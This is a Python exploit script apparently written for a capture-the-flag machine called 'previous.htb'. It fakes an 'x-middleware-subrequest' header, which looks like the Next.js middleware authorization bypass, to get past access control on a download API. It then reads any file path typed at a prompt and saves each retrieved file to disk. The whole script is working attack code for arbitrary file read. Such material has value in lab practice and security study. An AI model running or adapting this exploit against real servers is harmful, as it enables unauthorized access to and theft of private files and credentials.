import requests
import os

base_url = "http://previous.htb/api/download"

headers = {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
           "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
           }

while True:
    file_query = input("\n Enter file: ")

    if file_query.lower() == "exit":
        break

    params = {'example': file_query}
    response = requests.get(base_url, params=params, headers=headers)

    if response.status_code == 200:
        print(response.content)

        local_filename = os.path.basename(file_query)

        with open(local_filename, "wb") as outfile:
            outfile.write(response.content)
    else:
        print("file not found")
